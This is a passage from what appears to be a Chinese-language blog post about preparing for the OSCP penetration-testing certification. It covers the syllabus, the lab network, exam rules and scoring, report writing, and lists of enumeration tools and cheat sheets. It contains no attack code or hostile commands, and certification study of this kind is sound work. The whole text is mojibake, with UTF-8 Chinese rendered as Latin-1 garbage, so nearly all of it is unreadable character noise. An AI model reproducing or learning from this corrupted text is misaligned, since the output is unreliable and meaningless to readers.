ä¸Šï¼Œå¥½å¥½å®Œæˆæ‡‰è©²é‚„æ˜¯æ¯”è¼ƒåˆ’ç®—çš„ï¼Œç•¶ç„¶é‚„æ˜¯æœ‰æ›¿ä»£æ–¹æ¡ˆçš„ï¼Œçµ±æ•´åœ¨ç·´ç¿’å¹³å° çš„åœ°æ–¹ï¼š å ±ååŠæ•™æå ±åæ™‚å¯ä»¥åœ¨åå¤©çš„ç¯„åœå…§é¸æ“‡ä»€éº¼æ™‚å€™é–‹å§‹èª²ç¨‹ï¼Œå ±åæ™‚è¦æ³¨æ„çš„æ˜¯å¦‚æœå®˜æ–¹æ²’è¾¦æ³•å¾ Email Address ç›´æ¥ç¢ºèªèº«ä»½å’Œç™»è¨˜çš„æ©Ÿæ§‹ï¼Œé‚£å®˜æ–¹æœƒè¦æ±‚æƒæè‹±æ–‡çš„ ID ä¸Šå‚³ï¼Œé€™å€‹æƒ…æ³ä¸‹å°±æ˜¯å‚³è­·ç…§éå»ï¼Œå ±åç¨‹åºå®Œæˆå¾Œå®˜æ–¹æœƒçµ¦å¹¾æ¨£æ±è¥¿ï¼š ç¸½å…± 428 æ”¯çš„æ•™å­¸å½±ç‰‡ï¼Œæ˜¯æ•´åŒ… html çš„é‚£ç¨®å½¢å¼ 853 é çš„ pdf æ•™æ ç”¨ä¾†é€£é€² Lab ä»¥åŠ Lab Control Panel çš„ OpenVPN config ç™»å…¥å®˜æ–¹è«–å£‡çš„å¸³è™Ÿå¯†ç¢¼ï¼ˆä¸ç”¨ vpn ä¹Ÿèƒ½é€£ä¸Šï¼‰ æ¯”èµ·å½±ç‰‡çš„å…§å®¹ï¼Œpdf æœƒæ¯”è¼ƒå®Œæ•´ä¸€é»ï¼Œç„¶å¾Œé‚„æœ‰ä¸€é»å°±æ˜¯ï¼Œæ•™æä¸Šé¢éƒ½æœ‰æµ®æ°´å°ï¼Œä¸ç®¡æ˜¯åˆ»æ„æˆ–æ˜¯ä¸å°å¿ƒï¼Œåªè¦æµå‡ºçš„è©±è­‰ç…§å°±æœƒè¢«æ’¤éŠ·ï¼Œç•¶ç„¶ä¹ŸåŒ…å«æ´©æ¼è€ƒè©¦å…§å®¹åŠæœ‰é—œé€™å ‚èª²çš„ tipsã€‚ èª²ç¨‹å¤§ç¶±äº‹å¯¦ä¸Šå®˜æ–¹çš„èª²ç¨‹å¤§ç¶± å°±æ˜¯é‚£ 853 é  pdf æ•™æçš„å¤§ç¶±ï¼Œç›´æ¥çœ‹æ˜¯æœ€è©³ç´°äº†ï¼Œå„ç« çš„å…§å®¹éƒ½ä¸é›£ï¼Œå°±æ˜¯é–‹å§‹åš Lab çš„æ™‚å€™è¦ç†Ÿæ‚‰ä¸€ä¸‹æšèˆ‰é †åºè·Ÿè¨˜å¾—æœ‰ä»€éº¼å·¥å…·å¯ä»¥ç”¨ã€‚ é€™è£¡æ˜¯æˆ‘çš„ç¸½çµï¼Œæ•¸å­—çš„éƒ¨åˆ†ä¸¦æ²’æœ‰å°ä¸Š pdf çš„ç« ç¯€ï¼Œå¤§è‡´ä¸ŠåŒ…å«äº†ï¼š 1. åŸºæœ¬ Kali Linuxå°±ä¸€äº›åŸºæœ¬çš„è¨­å®šï¼ŒKali Linux å·²ç¶“æŠŠå¾ˆå¤šå¸¸ç”¨å·¥å…·æ•´åˆé€²å»ï¼Œä¾‹å¦‚ wordlist æˆ–æ˜¯å¸¸ç”¨çš„ webshell ç­‰ï¼Œç›´æ¥ç”¨ Kali æœƒçœå»å¾ˆå¤šéº»ç…©ï¼Œä½†æˆ‘å€‹äººé‚„æ˜¯å¦å¤–æŠŠå·¥å…·è·Ÿ wordlist éƒ½è£åœ¨ MacOS æˆ–æ˜¯ docker è£¡é¢ã€‚ 2. åŸºæœ¬ Linux æ“ä½œå¸¸ç”¨ commandã€pipe ä¹‹é¡çš„é‚£ç¨®å¾ˆ basic çš„æ±è¥¿ã€‚ 3. Netcatã€Socatã€Powershellã€Powercatç¸½ä¹‹å°±æ˜¯å¦‚ä½•åˆ©ç”¨å·¥å…·ä¸Šå‚³ä¸‹è¼‰æª”æ¡ˆï¼Œä»¥åŠå¦‚ä½•å½ˆ reverse shell å›ä¾†ã€‚ 4. Wiresharkã€Tcpdumpå°±å¦‚ä½•æ“·å–å°åŒ…ï¼Œå¹«ä¸€äº›ç¾æˆå·¥å…· debug çš„æ™‚å€™æ‰æœƒç”¨åˆ°ã€‚ 5. Bash scriptingå°±å¾ˆç°¡å–®çš„ Bash script ç”¨æ³•ã€‚ 6. Passive Information Gatheringæ•™æè£¡å° Passive çš„å®šç¾©åŸºæœ¬ä¸Šå°±æ˜¯æŒ‡ä¸ç›´æ¥è·Ÿç›®æ¨™æ¥è§¸æ‰€åšçš„è³‡è¨Šè’é›†ï¼Œè«¸å¦‚ Whoisã€æŸ¥ SSLã€Google Hackingã€OSINT ç­‰ã€‚ 7. Active Information Gatheringç›¸å°æ–¼ Passiveï¼ŒActive æŒ‡çš„æ˜¯èˆ‡ç›®æ¨™ç›´æ¥æ¥è§¸çš„è³‡è¨Šè’é›†ï¼Œä¾‹å¦‚ Port scanã€æ ¹æ“š port æƒå‡ºä¾†çš„æœå‹™åšå°æ‡‰çš„æšèˆ‰ï¼Œè¬›æšèˆ‰å¯èƒ½æœ‰é»æŠ½è±¡ï¼Œå…·é«”çš„ä¾‹å­åƒæ˜¯å¦‚æœç›®æ¨™æœ‰é–‹å•Ÿ SMB æœå‹™ï¼Œé‚£å°±è©¦è©¦çœ‹èƒ½ä¸èƒ½å¾—åˆ°ç‰ˆæœ¬ï¼Œæˆ–æ˜¯å…·é«”ä¸Š Share äº†ä»€éº¼é …ç›®å‡ºä¾†ã€‚ 8. å¼±é»æƒæå¦‚ä½•ä½¿ç”¨å¼±é»æƒæå·¥å…·ï¼ŒåŒ…å«å¤§ç¯„åœå¼±é»æƒæï¼Œå€¼å¾—ä¸€æçš„æ˜¯è€ƒè©¦çš„æ™‚å€™æ˜¯ç¦ç”¨å¤§ç¯„åœå¼±æƒçš„ã€‚ 9. Web Application æ”»æ“Šå°±é‚£äº› CTF æœƒé‡åˆ°çš„å„ç¨®å¥—è·¯ã€‚ 10. Buffer OverflowWindows è·Ÿ Linux çš„ BOFï¼Œä½†è¶…ç°¡å–®ï¼Œé€£ stack éƒ½ä¸æœƒç´°è¬›ï¼Œç”¨æœ€ç°¡å–®çš„æ–¹å¼ç›´æ¥ exploitï¼Œè“‹ returnã€æ‰¾ gadgetã€è·³ shellcodeã€‚ 11. Client-Side Attackså‰é¢æåˆ°çš„æ±è¥¿åŸºæœ¬ä¸Šéƒ½æ˜¯å¾€ä¸€å€‹ Server æ‰“ï¼Œå‡è¨­æœ‰å°ä¸»æ©Ÿä½œç‚º Client å»è¨ªå•å·²ç¶“è¢«ä½”é ˜çš„ä¸»æ©Ÿæˆ–æ˜¯å¯æ§çš„æœ‰æ¼æ´æœå‹™ï¼Œé‚£å°±æœ‰æ©Ÿæœƒå¯ä»¥è—‰æ­¤æ‰“é€²å»ï¼Œä¾‹å¦‚ Microsoft Office çš„å·¨é›†ç—…æ¯’æˆ–æ˜¯ HTA Attack ç­‰ã€‚ 12. Public Exploitation &amp; Fixing Exploitså¦‚ä½•å°‹æ‰¾å’Œä½¿ç”¨å…¬é–‹çš„ Exploitï¼Œæ­¤å¤–åœ¨æŸäº›æƒ…æ³ä¸‹ï¼Œå› ç‚ºé˜²ç«ç‰†æˆ–æ˜¯æƒ…å¢ƒäº›å¾®ä¸åŒï¼Œä½¿ç”¨å‰å¯èƒ½éœ€è¦èª¿æ•´ Exploitï¼Œåœ¨é€™éƒ¨åˆ†ä¹Ÿæœƒæåˆ°ã€‚ 13. File Transfersé€™å€‹ä»–ç‰¹åˆ¥æ‹‰å‡ºä¾†è¬›æ‡‰è©²æ˜¯å› ç‚º Windows ç’°å¢ƒæœ‰å¾ˆå¤šå°æŠ€å·§ï¼Œå› ç‚º Linux ä¸Šå¸¸ç”¨çš„å‚³æª”æ¡ˆæ–¹å¼ï¼Œåœ¨ Windows ä¸Šæ˜é¡¯ä¸å¯ç”¨ï¼Œé€™è£¡æœ‰æœƒè¬›å¦‚ä½•åˆ©ç”¨ Windows ä¸Šçš„ç›¸é—œå·¥å…·ä¾†é”åˆ°ä¸Šå‚³çš„ç›®çš„ã€‚ 14. Antivirus Evasionåœ¨æœ‰é˜²æ¯’è»Ÿé«”çš„æƒ…æ³ä¸‹å¦‚ä½•é€ƒé€¸ã€‚ 15. Privilege Escalationè·Ÿ CTF ä¸åŒï¼Œæ»²é€é€²ä¸€å°ä¸»æ©Ÿæ™‚é€éçš„å¯èƒ½æ˜¯ apache ä¸Šçš„ web applicationï¼Œé‚£é–‹å‡ºä¾†çš„ shell æœ‰å¾ˆå¤§æ©Ÿç‡å°±æ˜¯ www-dataï¼Œä¸ç®¡æ˜¯ç²å–æ©Ÿæ•è³‡æ–™æˆ–æ˜¯ä½œç‚ºæ»²é€æ¸¬è©¦ä¸­çš„ç«‹è¶³é»éƒ½ç¨å«Œä¸è¶³ï¼Œæ‰€ä»¥é€™å€‹éƒ¨åˆ†æ˜¯åœ¨è¬›å¦‚ä½•ææ¬Šã€‚ 16. Password AttacksåŸºæœ¬ä¸Šå°±æ˜¯å„é¡æš´åŠ›æšèˆ‰å¯†ç¢¼çš„å·¥å…·ã€‚ 17. Port Redirection and Tunnelingå…§ç¶²è£¡é¢æœƒæœ‰ä¸åŒç¶²æ®µï¼Œå¯èƒ½åªèƒ½é€éä¸­é–“çš„ä¸€å°æ©Ÿå™¨åš proxy ä¾†å­˜å–å…§ç¶²ï¼Œé€™æ™‚å€™é€£ Port scan éƒ½æœƒæœ‰é»å°å•é¡Œï¼Œä¸»è¦çš„å•é¡Œæ˜¯ reverse shell å¯èƒ½æ²’è¾¦æ³•ç›´æ¥å¾è£¡é¢å½ˆåˆ°æœ€å¤–é¢ä¾†ï¼Œæˆ–æ˜¯ä¸»æ©Ÿçš„æŸäº›å…·æœ‰å¼±é»çš„æœå‹™å› ç‚ºé˜²ç«ç‰†çš„é—œä¿‚ç„¡æ³•å¾é ç«¯å­˜å–æ™‚ï¼Œå¯ä»¥é€é port forwarding çš„æ–¹å¼ä¾†è§£æ±ºã€‚ 18. Active Directory AttacksActive Directory æ˜¯ Windows Server ä¸Šç”¨ä¾†é›†ä¸­ç®¡ç†ä¸€å€‹çµ„ç¹”è£¡çš„ä½¿ç”¨è€…ã€ç¾¤çµ„ã€é›»è…¦ç­‰ç­‰çš„ä¸€å€‹æœå‹™ï¼Œä¸­æ¨æ˜¯ä¸€åˆ°å¤šå°çš„ Domain Controllerï¼Œé€™éƒ¨åˆ†ä¸»è¦æ˜¯æ•™å¦‚ä½•æšèˆ‰åŠåˆ©ç”¨ NTLM æˆ– Kerberos æ»²é€ Domain ä¸­çš„å…¶ä»–æ©Ÿå™¨ã€‚ 19. The Metasploit Frameworkå¦‚ä½•ä½¿ç”¨ Metasploit Frameworkï¼ŒåŸ·å¾—ä¸€æçš„æ˜¯è€ƒè©¦ä¸­åªèƒ½é¸å®šä¸€å°æ©Ÿå™¨ä½¿ç”¨ï¼Œä¸è«–æˆåŠŸèˆ‡å¦ï¼Œå°å…¶ä»–å°æ©Ÿå™¨ä½¿ç”¨æœƒç›´æ¥å¤±æ ¼ã€‚ 20. PowerShell Empireåœ¨ Windows ä¸Šé¢åšæšèˆ‰æˆ–æ˜¯åº•å±¤æ“ä½œéå¸¸ç—›è‹¦ï¼Œæ²’æœ‰ PowerShell åŸºæœ¬ä¸Šå‹•ä¸äº†ï¼ŒPowershell å¯«èµ·ä¾†åŸºæœ¬ä¸Šå°±æ˜¯ C#ï¼Œå¯«èµ·ä¾†ä¹Ÿä¸æ˜¯ç‰¹åˆ¥è¼•å·§ï¼Œå–„ç”¨å·¥å…·å¯ä»¥çœä¸‹å¾ˆå¤šæ™‚é–“ï¼ŒPowerShell Empire å°±æ˜¯å…¶ä¸­ä¸€å€‹ã€‚ 21. Lab ç¯„ä¾‹é€™è£¡æœƒç”¨ Lab ç¤ºç¯„å‰é¢æåˆ°çš„å…¨éƒ¨æ¦‚å¿µï¼Œä½†é€™è£¡çš„æ©Ÿå™¨ä¸¦ä¸æ˜¯é‚£ 66 å°ï¼Œæ‰€ä»¥å®˜æ–¹æ‰æœƒèªª Lab æœ‰ 70 å°ã€‚ Lab ç’°å¢ƒæ¶æ§‹çš„ç¤ºæ„åœ–å–è‡ªå®˜ç¶²ï¼ŒLab ç’°å¢ƒéœ€é€é VPN æ‰èƒ½é€£ä¸Šï¼Œä¸‹é¢çš„ Private Student Segment æ˜¯çµ¦å­¸å“¡ä½¿ç”¨çš„ Windows æ©Ÿå™¨å¯ä»¥ä»»æ„ revertï¼Œä¸æ˜¯å…±ç”¨çš„ï¼Œè£¡é¢åŒ…å«ä¸€äº›ç¯„ä¾‹ä½¿ç”¨çš„å·¥å…·ç­‰ç­‰ï¼Œé™¤æ­¤ä¹‹å¤–çš„æ©Ÿå™¨éƒ½æ˜¯è·Ÿåˆ¥äººå…±ç”¨ï¼Œæ‰€ä»¥è¨˜å¾—åœ¨é–‹æ‰“ä¹‹å‰å…ˆ revertï¼Œæ‰“å®Œä¹Ÿè¦è¨˜å¾— revertï¼Œæˆ‘åš Lab æ™‚æœ‰ä¸€é¡Œæ˜æ˜å°±æœ‰é˜²æ¯’è»Ÿé«”ï¼Œä¸€å †äººåœ¨è«–å£‡ä¸Šè¬›ä¸€äº›çœ‹èµ·ä¾†å°±æ˜¯ç”¨é˜²æ¯’è»Ÿé«”å·²ç¶“è¢«é—œæ‰çš„æ‰“æ³•åœ¨æ‰“â€¦ å¾€ä¸Šçœ‹åˆ° Sandbox è£¡é¢æœ‰å››å°æ©Ÿå™¨ï¼Œå…¶å¯¦å°±æ˜¯èª²ç¨‹å¤§ç¶± è£¡é¢ Lab ç¤ºç¯„çš„å››å°ï¼Œé™¤äº†é€™å››å°ä¹‹å¤–å¦å¤–é‚„æœ‰ 66 å° Labï¼ŒLab çš„ä¸»è¦ç›®æ¨™æ˜¯æ‹¿åˆ° /root/proof.txt æˆ–æ˜¯ C:\\Users\\Administrator\\proof.txt é€™ç¨®é«˜æ¬Šé™çš„æª”æ¡ˆï¼Œä¸€é–‹å§‹æ»²é€åªèƒ½æ¥è§¸åˆ° Public Network çš„æ©Ÿå™¨ï¼Œæ‰“ä¸‹æŸäº›æ©Ÿå™¨å¾Œæœƒç™¼ç¾è©²æ©Ÿå™¨æœ‰å¦å¤–ä¸€å€‹ç¶²æ®µçš„ IP åŒæ™‚ä¹Ÿæœƒç™¼ç¾network-secret.txtï¼Œé€™å€‹æª”æ¡ˆæ˜¯ç”¨ä¾†é–‹å•Ÿ Control Panel è·Ÿè«–å£‡çš„å°æ‡‰å€å¡Šç”¨çš„ã€‚ Lab çš„ Learning Pathå®˜æ–¹å…¶å¯¦æœ‰çµ¦å‡ºä¸€æ¢ Learning Path çµ¦é‚„æ²’é€²å…¥ç‹€æ³çš„äººèµ°ï¼Œç¸½å…± 11 å°æ©Ÿå™¨ï¼Œä¸éæˆ‘åœ¨ç©çš„æ™‚å€™æ˜¯ 12 å°ï¼Œå…¶ä¸­ä¸€å° JOE ä¸€ç›´æ˜¯å£çš„â€¦ï¼Œçœ‹ä¾†ç¾åœ¨æ˜¯è¢«æ‹¿ä¸‹ä¾†äº†ã€‚ Path ä¸Šé›–ç„¶æœ‰æ¨™ easyã€mediumã€hard çš„é›£åº¦ï¼Œä½†æˆ‘å€‹äººçš„æ„Ÿè¦ºéƒ½æ˜¯ easyï¼Œå°±æ˜¯ç”¨ä¾†æŒæ¡ä¸€ä¸‹æ•´å€‹ OSCP çš„æ„Ÿè¦ºã€‚ Lab çš„å¾¡ä¸‰å®¶ With Pain comes Sufferance and you get Humble é€™å€‹è¶…è®šçš„æ¨™é¡Œæ˜¯vishnuraj ä¸€ç¯‡ä»‹ç´¹ OSCP çš„æ–‡ç« æ‰€ç”¨çš„æ¨™é¡Œï¼Œé€™ä¸‰å°æ©Ÿå™¨çš„ hostname å°±å«åš Painã€Sufferanceã€Humbleï¼Œæ“šèªªæ˜¯æœ€é›£çš„ä¸‰å°ï¼Œæˆ‘è§£ç¬¬äºŒå°å°±é‡åˆ° Painï¼Œè§£å®ŒçœŸçš„è¶…æ°£&#x3D; &#x3D;ï¼Œä½†ä¹Ÿé †ä¾¿æª¢è¨ç‚ºä»€éº¼åŸºæœ¬çš„æšèˆ‰è‡ªå·±æ²’åšå®Œå…¨ï¼Œæˆ‘æ˜¯æ¨è–¦å»æŠŠé€™ä¸‰å°åšå®Œå†å»è€ƒè©¦ï¼ŒæŠŠ Pain åšæ‰å°±å¥½äº†ï¼Œå¾Œé¢å…©å°æ‡‰è©²æ˜¯è¶…éè€ƒè©¦ç¯„åœäº†ã€‚ Lab çš„æ³¨æ„äº‹é …å› ç‚º Lab å°±æ˜¯æ¨¡æ“¬ä¸€æ¬¡çœŸæ­£çš„æ»²é€æ¸¬è©¦ï¼Œæ‰€ä»¥é€™æ•´å€‹å‡æƒ³çš„çµ„ç¹”è£¡é¢çš„ä½¿ç”¨è€…è·Ÿé›»è…¦ä¹Ÿéƒ½æ˜¯æ¯æ¯ç›¸é—œçš„ï¼ŒåŒ…å«ä»–å€‘çš„å¸³è™Ÿå¯†ç¢¼ï¼Œæ‰€ä»¥æ¯æ‰“å®Œä¸€å°æ©Ÿå™¨éƒ½è¦è¨˜å¾—æœåˆ®æ‰€æœ‰çš„ credentialï¼Œåœ¨ Learning Path è£¡é¢å°±å·²ç¶“æœ‰æ©Ÿå™¨æ˜¯ç›¸ä¾çš„ï¼Œå¦‚æœæ²’æœ‰ credential åŸºæœ¬ä¸Šåšä¸å‡ºä¾†ã€‚ é€™ä¹Ÿå°±æ˜¯ç‚ºä»€éº¼æˆ‘å€‘åªæœ‰å®Œæˆ 58 å°æ©Ÿå™¨ï¼Œå› ç‚ºå‰©ä¸‹çš„å¥½å¹¾å°æ©Ÿå™¨éƒ½éœ€è¦ç”¨åˆ°ä¸Šä¸€å°æ©Ÿå™¨æœåˆ®å‡ºä¾†çš„ credential æ‰èƒ½ç™»å…¥ï¼Œæ¥ä¸‹ä¾†æ‰æ˜¯ææ¬Šï¼Œæœ€å¾Œçš„é€™æ•´çµ„æ©Ÿå™¨çš„ç›¸ä¾æ€§æ˜¯å¾ Develop department çš„å…©å°æ©Ÿå™¨ä¸²åˆ° Public Network çš„ä¸‰å°æ©Ÿå™¨ï¼Œç„¶å¾Œå†ä¸²å› IT éƒ¨é–€ï¼Œæˆ‘å€‘æ˜¯å¡åœ¨é‚£é‚Šçœ‹è«–å£‡æ‰çŸ¥é“â€¦ï¼Œä¸é IT è£¡é¢æœ‰ä¸€å° nina å°±çœŸçš„æ˜¯å–®ç´”ä¾†ä¸åŠæ‰“ã€‚ åŠ åˆ†é …ç›®æ›´å‰é¢æœ‰æåˆ°é€šéè€ƒè©¦è¦ 70 åˆ†ï¼Œä½†å¦‚æœæäº¤ Lab çš„ writeup æ˜¯æœ‰æ©ŸæœƒåŠ äº”åˆ†çš„ï¼Œwriteup çš„è©³ç´°ç¨‹åº¦è¦è·Ÿè€ƒè©¦æäº¤çš„å ±å‘Šä¸€æ¨£è©³ç´°ï¼Œè½èµ·ä¾†æ¥µåº¦éº»ç…©ï¼Œæ‰€ä»¥æˆ‘æ²’åšï¼Œæ­¤å¤– Alphaã€Beta å…©å°æ©Ÿå™¨å› ç‚ºæ•™æè£¡é¢æœ‰æ•™å­¸æ‰€ä»¥ä¸éœ€è¦äº¤ã€‚ è€ƒè©¦æº–å‚™åŠæ³¨æ„äº‹é …Lab çµæŸä¹‹å¾Œåœ¨ 120 å¤©ä¹‹å…§å¯ä»¥é ç´„è€ƒè©¦ï¼Œå»ºè­°æ—©ä¸€é»é¸æ™‚é–“ï¼Œä¸ç„¶æœƒå‰©ä¸‹å¾ˆçˆ›çš„æ™‚é–“ï¼Œä¾‹å¦‚ä»€éº¼åŠå¤œå…©é»é–‹å§‹ï¼Œæˆ‘æ˜¯é¸ 2&#x2F;5 æ—©ä¸Šä¹é»ï¼Œæ‰€ä»¥è€ƒè©¦å°±æ˜¯æŒçºŒåˆ° 2&#x2F;6 æ—©ä¸Šä¹é»ï¼Œè€ƒè©¦çš„æ™‚å€™åŸºæœ¬ä¸Šæ˜¯ 24 å°æ™‚è¢«ç›£æ§çš„ç‹€æ…‹ï¼Œwebcam æ˜¯å¿…å‚™è¨­å‚™ï¼Œåªè¦æ¸…æ™°åˆ°å¯ä»¥çœ‹å¾—åˆ°è­·ç…§ä¸Šçš„è³‡æ–™å°±æ²’å•é¡Œäº†ï¼Œè€ƒè©¦æ™‚è€ƒç”Ÿå‰ 15 åˆ†é˜é€£é€²ä¸€å€‹æœ‰èŠå¤©å®¤åŠŸèƒ½çš„ç›£è€ƒç¶²é ï¼Œé€™æ®µæ™‚é–“ç›£è€ƒå®˜æœƒè¦æ±‚è®“ä»–çœ‹ä¸€ä¸‹ç’°å¢ƒï¼Œç„¶å¾Œæé†’ä¸èƒ½ä½¿ç”¨æ‰‹æ©Ÿç­‰ï¼Œæ‰€ä»¥å¯¦éš›è€ƒè©¦æ™‚é–“æ˜¯ 23 å°æ™‚ 45 åˆ†é˜ï¼Œæ¥ä¸‹ä¾†çš„æ™‚é–“è£¡ç›£è€ƒå®˜æœƒè¼ªç­ç›¯è‘—ä½ çš„å‚»è‡‰è·Ÿè¢å¹•çœ‹ã€‚ æœ‰ä¸€é»è¦æ³¨æ„çš„æ˜¯è¨­å®šå¥½ VPN ä¹‹å¾Œæœƒéœ€è¦è·‘ script ç´€éŒ„ç¶²è·¯è¨­å®šç„¶å¾Œè²¼çµ¦ç›£è€ƒå®˜çœ‹ï¼Œå› ç‚ºé€™é–€èª²å°±å«åš PWK æ‰€ä»¥æ‰€æœ‰æ±è¥¿åœ¨ Kali ä¸‹é‹è¡Œä¸€å®šæ˜¯æ²’å•é¡Œçš„ï¼ŒåŒ…æ‹¬é€™å€‹ script æœ¬ä¾†å°±æ˜¯é‡å° Linux å¯«çš„ï¼Œå¦‚æœè€ƒè©¦ä¸æƒ³å‡ºåŒ…ç›´æ¥ç”¨ Kali æœ€ä¿éšªï¼Œå…¶ä»–è€ƒè©¦éœ€è¦æ³¨æ„çš„æ±è¥¿å¤§æ¦‚å¦‚ä¸‹ï¼š Writeup éœ€è¦æˆªåœ–ï¼Œ24 å°æ™‚ä¸€åˆ° vpn å°±æœƒæ–·æ‰ï¼Œæ²’æœ‰æ©Ÿæœƒè£œåœ–ï¼Œè¨˜å¾—ä¸€ç›´æˆªåœ–ï¼Œä½†æ˜¯ä¸è¡ŒéŒ„å½± Exploit è·Ÿå…¬é–‹çš„ç‰ˆæœ¬å¦‚æœæ²’å·®åˆ¥åªè¦é™„ä¸Š URL ï¼Œæœ‰å·®åˆ¥å‰‡è¦æŒ‡æ˜å“ªè£¡æœ‰ä¿®æ”¹ã€ç‚ºä½•è¦ä¿®æ”¹ éœ€è¦ææ¬Šçš„æ©Ÿå™¨æœ‰ local.txt è·Ÿ proof.txt å…©å€‹æª”æ¡ˆï¼Œå·®åˆ¥åœ¨æœ‰æ²’æœ‰ææ¬Šï¼Œæ ¹æ“šæˆ‘çš„ç¶“é©—è·Ÿå…¶ä»–äººçš„åˆ†äº«ï¼Œæ‹¿åˆ° local.txt å¯ä»¥æ‹¿ä¸€åŠçš„åˆ†æ•¸ï¼ˆå®˜æ–¹æ²’èªªï¼‰ å¿…é ˆæ‹¿åˆ° interactive shell ä¸¦ä¸”åœ¨ä¸ç§»å‹• proof.txt çš„æƒ…æ³ä¸‹å°å‡ºä¾†æ‰åˆæ³•ï¼Œæ‰€ä»¥ LFI æ‹¿ proof ä¸ç®—æ•¸ å¿…é ˆé™„ä¸ŠåŒ…å« cat proof.txt ä»¥åŠ ifconfig æˆ– ipconfig æˆ– ip a çš„æˆªåœ–é€² writeupï¼Œå¦å‰‡å¯èƒ½æœƒè¢«æ‰£åˆ†æˆ–æ­¸é›¶ ç¦æ­¢äº‹é … Spoofingï¼Œå¦‚ IP spoofingã€ARP spoofingã€DNS spoofing é‚£é¡ Commercial ç‰ˆçš„å·¥å…·ï¼Œå¦‚ Metasploit Proã€Burp Proï¼Œå¯ä»¥é¡æ¨ IDA Pro ä¹Ÿæ˜¯ï¼Œä½†ä¹Ÿç”¨ä¸åˆ°å°±æ˜¯äº† è‡ªå‹•åŒ– exploit å·¥å…·ï¼Œå¦‚ SQLmap é‚£é¡çš„ å¤§ç¯„åœå¼±æƒï¼Œå¦‚ Nessus é‚£é¡çš„ å¾è€ƒè©¦ç’°å¢ƒä¸‹è¼‰ä»»ä½•æª”æ¡ˆ Metasploit çš„ Auxiliaryã€Exploitã€Post æ¨¡çµ„åªèƒ½å°ä¸€å°è‡ªé¸çš„æ©Ÿå™¨ä½¿ç”¨ï¼Œç„¡è«–æœ‰æ²’æœ‰æˆåŠŸéƒ½ä¸èƒ½æ›ç›®æ¨™ï¼ŒåŒ…å« exploit checkï¼Œå»ºè­°è¦ç”¨çš„æ™‚å€™åœ¨èŠå¤©å®¤è·Ÿç›£è€ƒå®˜èªªä¸€ä¸‹ ä¸‹é¢å››å€‹å·¥å…·ä¸å—é™æ–¼ Metasploit åªèƒ½å°ä¸€å°ä½¿ç”¨çš„é™åˆ¶ exploit&#x2F;multi&#x2F;handler msfvenom pattern_create.rb pattern_offset.rb è€ƒè©¦æœƒæœ‰äº”é¡Œå…± 100 åˆ†çš„é¡Œç›®ï¼Œé…åˆ†æ˜¯ 10ã€20ã€20ã€25ã€25ï¼Œä¸€å®šæœ‰ä¸€é¡Œ 25 åˆ†çš„ BOF é¡Œï¼Œçµåˆç¦æ­¢äº‹é …çš„ç¬¬äº”é»ï¼Œæ©ï¼Œå¯ä»¥æƒ³æƒ³çœ‹æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Œé‚„æœ‰å°±æ˜¯é¡Œç›®æœƒå¡å¾ˆå¤šèª¤å°çš„æ±è¥¿ï¼Œæ™‚é–“æ§ç®¡å¾ˆé‡è¦ã€‚ è€ƒè©¦çµæŸä¹‹å¾Œï¼Œå­¸å“¡æœ‰å¦å¤– 24 å€‹å°æ™‚å¯ä»¥æ’°å¯«å ±å‘Šï¼Œé€™å€‹å ±å‘Šçš„å®šä½æ˜¯å¯«çµ¦ç”²æ–¹çœ‹çš„é‚£ç¨®å ±å‘Šï¼ŒåŒ…æ‹¬éæŠ€è¡“ç´°ç¯€åŠå±è©±ï¼Œé€™è£¡æ˜¯å®˜æ–¹çš„æ¨£æ¿ï¼Œæˆ‘å€‹äººæ˜¯ç”¨ç¤¾ç¾¤çš„æ¨£æ¿ï¼Œæ­¥é©Ÿè¦è©³ç´°åˆ°å¯ä»¥ copy paste å°±é‡ç¾ã€‚ æœ€æœ‰è¶£çš„å¤§æ¦‚å°±æ˜¯ä¸€ç›´ç”¨ç¬¬ä¸‰äººç¨±å¯«å ±å‘Šè¶…ç´šä¸­äºŒçš„ï¼Œä¾‹å¦‚ï¼š OS-83952 found that the CMS is prone to LFI ä¹‹é¡çš„ï¼Œå‘µå‘µã€‚ é‚„æœ‰ä¸€å€‹å°±æ˜¯ rdesktop å¦‚æœæ˜¯è€ƒè©¦çš„ç¶²è·¯ç’°å¢ƒï¼Œæˆ‘åœ¨ MacOS ä¸Šé¢ç”¨ç•«é¢æœƒæ’•è£‚ï¼Œæ…¢åˆ°å¹¾ä¹ä¸å¯ç”¨ï¼Œä½†åœ¨ Kali è£¡é¢åŠ ä¸Šé¸é … -P -z é€Ÿåº¦å·®è¶…å¤š&#x3D; &#x3D;â€¦ï¼Œç¸½ä¹‹å¦‚æœå‡ºäº‹å°±å›å»ç”¨ Kali å°±å°äº†ã€‚ å…è²»è³‡æºé€™äº›æ˜¯ä¹‹å‰èª¿æŸ¥æ™‚æ•´ç†å‡ºä¾†çš„å…è²»è³‡æºï¼Œé›–ç„¶ä¸æ˜¯æ¯å€‹æˆ‘éƒ½ç”¨éï¼Œä½†å°±çµ±ä¸€æ”¾åœ¨é€™è£¡å§ Kali Trainingï¼Œå®˜æ–¹è‡ªå·±ç¶­è­·çš„ Kali ç·šä¸Šèª²ç¨‹ã€‚ Metasploit Unleashedï¼Œå®˜æ–¹è‡ªå·±ç¶­è­·çš„ Metasploit æ•™å­¸ã€‚ Basic Linux Privilege Escalationï¼Œå¾ˆå¤šäººåœ¨è«–å£‡è£¡é¢ä¹Ÿæ¨è–¦ï¼Œæ ¹æ“šè«–å£‡ç´€éŒ„ï¼Œä½œè€… g0tmi1k ä¹Ÿæ˜¯ OffSec çš„å“¡å·¥ã€‚ OSCP: Developing a Methodologyï¼Œæˆ‘åœ¨æ•´ç†é€™ç¯‡æ–‡ç« çš„æ™‚å€™æ‰æŸ¥åˆ°ï¼Œæ»¿å®Œæ•´çš„å·¥å…·æ•´ç†ã€‚ Unofficial OSCP Approved Toolsï¼ŒåŒä¸Šã€‚ è‡ªå‹•æšèˆ‰è…³æœ¬ (å»ºè­°ä¸€é–‹å§‹åš Lab å…ˆä¸è¦ç”¨ï¼Œè‡ªå·±ç†Ÿæ‚‰ä¸€ä¸‹ææ¬Šçš„æšèˆ‰æµç¨‹ï¼Œä¹Ÿä¸è¦åªç”¨å–®ä¸€è…³æœ¬ï¼Œè¨˜å¾—äº¤å‰æª¢æŸ¥) Linux LinEnum LinPEAS Linux Smart Enumeration Windows WinPEAS PrivescCheck CheatSheets PayloadAllTheThings Windows-Post-Exploitation Red Teaming Experiments Active Directory Exploitation Cheat Sheet ç·´ç¿’å¹³å°å› ç‚ºå®˜æ–¹çš„ Lab 